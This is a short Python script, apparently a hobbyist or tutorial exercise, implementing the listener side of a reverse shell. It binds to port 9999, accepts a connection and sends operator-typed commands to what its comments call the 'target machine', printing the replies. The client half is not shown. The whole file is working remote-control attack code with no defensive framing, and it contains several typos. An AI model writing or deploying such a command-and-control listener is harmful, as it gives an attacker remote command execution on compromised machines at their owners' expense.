import socket
import sys

def create_socket():
    try:
        global host
        global port
        global s
        host=''
        port =9999
        s=socket.socket()
    except socket.error as msg:
        print('Cannot create socket, something has gone wrong'+str(msg))


def bindn_socket():
    try:


        print('Binding socket and port'+str(port))
        s.bind((host,port))
        s.listen(5)#be ready for connection, 5 is the maximum number of connections that can be in queue
    except socket.error as msg:
        print('Sokcet binding error'+ str(msg))
        bindn_socket()


#Establish connection with client
def socket_accpet():
    #conn-actual connection
    conn,address=s.accept()
    print('Connection has been establish with IP'+ address[0]+ 'via port:'+ str(address[1]))
    send_command(conn)
    conn.close()


#send commands to target machine
def send_command(conn):
    while True:
        cmd=input()
        if cmd=='quit':
            conn.close()
            s.close()
            sys.exit()
#str.encode beceause we are working iwth bits and string  so we must be
#sure that everything is going smoothly
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            response=str(conn.recv(1024))
            print(response)



def main():
    create_socket()
    bindn_socket()
    socket_accpet()



main()
